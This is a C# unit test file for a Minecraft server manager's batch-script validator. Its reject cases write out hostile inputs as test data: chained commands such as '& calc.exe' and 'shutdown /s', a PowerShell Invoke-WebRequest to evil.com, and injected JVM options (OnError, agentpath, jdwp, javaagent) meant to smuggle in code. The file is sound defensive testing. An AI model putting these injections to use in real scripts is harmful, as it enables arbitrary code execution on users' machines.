using MinecraftServerManager.Infrastructure.Servers;

namespace MinecraftServerManager.UnitTests.Servers;

public sealed class SafeScriptValidatorTests : IDisposable
{
    private readonly TempDirectory _temp = new("msm-test-script-");

    public void Dispose() => _temp.Dispose();

    [Theory]
    [InlineData("@echo off & calc.exe")]
    [InlineData("echo off | evil.exe")]
    [InlineData("rem comment > evil.bat")]
    [InlineData("title safe < evil.txt")]
    [InlineData("@echo off ^& calc.exe")]
    [InlineData("pause & shutdown /s")]
    [InlineData("chcp 65001 & notepad")]
    [InlineData("chcp 65001 > evil.bat")]
    [InlineData("chcp 65001 >> evil.txt")]
    [InlineData("chcp 65001 & calc > nul")]
    [InlineData("echo !PATH!")]
    [InlineData("java %COMSPEC%")]
    [InlineData("java -jar %USERPROFILE%\\server.jar")]
    [InlineData("java @..\\outside.txt\r\n")]
    [InlineData("powershell -Command Invoke-WebRequest http://evil.com\r\n")]
    [InlineData("@echo off\r\n\"C:\\Java\\bin\\java.exe\" -Xms1024M -Xmx2048M -XX:OnError=calc.exe -jar \"server.jar\" nogui %*")]
    [InlineData("@echo off\r\n\"C:\\Java\\bin\\java.exe\" -Xms1024M -Xmx2048M -XX:OnOutOfMemoryError=calc.exe -jar \"server.jar\" nogui %*")]
    [InlineData("@echo off\r\n\"C:\\Java\\bin\\java.exe\" -Xms1024M -Xmx2048M -xx:onerror=calc.exe -jar \"server.jar\" nogui %*")]
    [InlineData("@echo off\r\n\"C:\\Java\\bin\\java.exe\" -Xms1024M -Xmx2048M -agentpath:C:/evil.dll -jar \"server.jar\" nogui %*")]
    [InlineData("@echo off\r\n\"C:\\Java\\bin\\java.exe\" -Xms1024M -Xmx2048M -agentlib:jdwp=transport=dt_socket -jar \"server.jar\" nogui %*")]
    [InlineData("@echo off\r\n\"C:\\Java\\bin\\java.exe\" -Xms1024M -Xmx2048M -Xbootclasspath/a:evil.jar -jar \"server.jar\" nogui %*")]
    [InlineData("@echo off\r\ncd /d \"%~dp0\"\r\njava -jar server.jar")]
    [InlineData("@echo off\r\ncd /d \"%~dp0\"\r\n\"java\" -jar server.jar")]
    [InlineData("@echo off\r\ncd /d \"%~dp0\"\r\njava.exe -jar server.jar")]
    [InlineData("@echo off\r\ncd /d \"%~dp0\"\r\n\"java.exe\" -jar server.jar")]
    [InlineData("@echo off\r\nC:\\Java\\bin\\java.exe;calc -jar server.jar\r\n")]
    [InlineData("@echo off\r\nC:\\Java\\bin\\java.exe,x -jar server.jar\r\n")]
    [InlineData("@echo off\r\n\"C:\\Java\\bin\\java.exe\" -jar \"C:\\Other\\server.jar\"\r\n")]
    [InlineData("@echo off\r\n\"C:\\Java\\bin\\java.exe\" @C:\\Other\\args.txt\r\n")]
    [InlineData("@echo off\r\nC:\\Java\\bin\\java.exe=calc -jar server.jar\r\n")]
    public void ValidateScriptContent_RejectCases_ReturnsFalse(string scriptContent)
    {
        string subDir = Path.Combine(_temp.FullName, Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(subDir);
        string script = Path.Combine(subDir, "run.bat");
        File.WriteAllText(script, scriptContent);

        Assert.False(SafeScriptValidator.ValidateScriptContent(script, subDir));
    }

    [Theory]
    [InlineData("""
        REM Forge server start script
        @echo off
        chcp 65001
        cd /d "%~dp0"
        "C:\Program Files\Java\jdk-21\bin\java.exe" @user_jvm_args.txt @libraries/net/minecraftforge/forge/1.20.1/win_args.txt %*
        pause
        """)]
    [InlineData("""
        @echo off
        chcp 65001 > nul
        cd /d "%~dp0"
        "C:\Java\bin\java.exe" -Xms1024M -Xmx2048M -jar "server.jar" nogui %*
        """)]
    [InlineData("""
        @echo off
        chcp 65001 >nul
        cd /d "%~dp0"
        "C:\Java\bin\java.exe" -Xms1024M -Xmx2048M -jar "server.jar" nogui %*
        """)]
    [InlineData("""
        @echo off
        @chcp 65001 > nul
        cd /d "%~dp0"
        "C:\Java\bin\java.exe" -Xms1024M -Xmx2048M -jar "server.jar" nogui %*
        """)]
    [InlineData("@echo off\r\n\"C:\\Java\\bin\\java.exe\" -jar \"%~dp0server.jar\" nogui\r\n")]
    [InlineData("@echo off\r\nC:\\Java\\bin\\java.exe\t-jar server.jar nogui\r\n")]
    public void ValidateScriptContent_AcceptCases_ReturnsTrue(string scriptContent)
    {
        string subDir = Path.Combine(_temp.FullName, Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(subDir);
        string script = Path.Combine(subDir, "start_server.bat");
        File.WriteAllText(script, scriptContent);

        Assert.True(SafeScriptValidator.ValidateScriptContent(script, subDir));
    }

    [Fact]
    public void ValidateScriptContent_ScriptOutsideServerDirectory_Rejects()
    {
        string dir = Path.Combine(_temp.FullName, "server");
        string outsideDir = Path.Combine(_temp.FullName, "outside");
        Directory.CreateDirectory(dir);
        Directory.CreateDirectory(outsideDir);
        string script = Path.Combine(outsideDir, "outside.bat");
        File.WriteAllText(script, "@echo off\r\njava -jar server.jar\r\n");

        Assert.False(SafeScriptValidator.ValidateScriptContent(script, dir));
    }

    [Fact]
    public void ValidateScriptContent_ArgumentFileWithBlockedOption_Rejects()
    {
        string dir = Path.Combine(_temp.FullName, "argfile_test");
        Directory.CreateDirectory(dir);
        File.WriteAllText(Path.Combine(dir, "user_jvm_args.txt"), "# 使用者參數\n-Xmx4G\n-javaagent:evil.jar\n");
        string script = Path.Combine(dir, "run.bat");
        File.WriteAllText(script, "@echo off\r\n\"C:\\Java\\bin\\java.exe\" @user_jvm_args.txt -jar server.jar %*\r\n");

        Assert.False(SafeScriptValidator.ValidateScriptContent(script, dir));

        File.WriteAllText(Path.Combine(dir, "user_jvm_args.txt"), "# 使用者參數\n-Xmx4G\n");
        Assert.True(SafeScriptValidator.ValidateScriptContent(script, dir));
    }

    [Fact]
    public void ValidateScriptContent_JunctionJarTarget_Rejects()
    {
        string dir = Path.Combine(_temp.FullName, "junction_test");
        Directory.CreateDirectory(dir);
        string outside = Path.Combine(_temp.FullName, "junction_outside");
        Directory.CreateDirectory(outside);
        using var junction = new TestJunction(Path.Combine(dir, "linked"), outside);
        string script = Path.Combine(dir, "run.bat");
        File.WriteAllText(script, "@echo off\r\n\"C:\\Java\\bin\\java.exe\" -jar \"linked\" nogui\r\n");

        Assert.False(SafeScriptValidator.ValidateScriptContent(script, dir));
    }
}
